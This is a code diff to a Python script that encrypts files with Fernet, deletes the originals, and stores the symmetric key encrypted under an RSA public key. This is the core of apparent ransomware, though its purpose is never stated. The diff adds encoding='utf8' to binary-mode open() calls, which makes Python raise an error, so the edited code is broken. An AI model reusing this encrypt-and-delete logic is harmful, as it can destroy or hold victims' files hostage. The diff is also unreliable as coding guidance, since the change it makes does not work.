@@ -49,10 +49,10 @@ def encrypt_files(files, key):
     for file in files:
         output = f'{file}{ENCRYPTED_SUFFIX}'
         try:
-            with open(file, "rb") as f:
+            with open(file, 'rb', encoding='utf8') as f:
                 data = f.read()
             data = fernet.encrypt(data)
-            with open(output, "wb") as f:
+            with open(output, 'wb', encoding='utf8') as f:
                 f.write(data)
             os.remove(file)
             encrypted.append({
@@ -74,12 +74,12 @@ def save_encrypted_key(file, sym_key):
             label=None
         )
     )
-    with open(file, 'w') as f:
+    with open(file, 'w', encoding='utf8') as f:
         f.write(cipher.hex())
 
 
 def save_encryption_logs(file, logs):
-    with open(file, 'w') as f:
+    with open(file, 'w', encoding='utf8') as f:
         json.dump(logs, f)
 
 
@@ -102,6 +102,6 @@ if __name__ == '__main__':
     import sys
     if len(sys.argv) > 1:
         key_file = sys.argv[1]
-        with open(key_file, 'r') as f:
-                PUBLIC_KEY = bytes(f.read(), 'utf-8')
+        with open(key_file, 'r', encoding='utf8') as f:
+            PUBLIC_KEY = bytes(f.read(), 'utf-8')
     main()
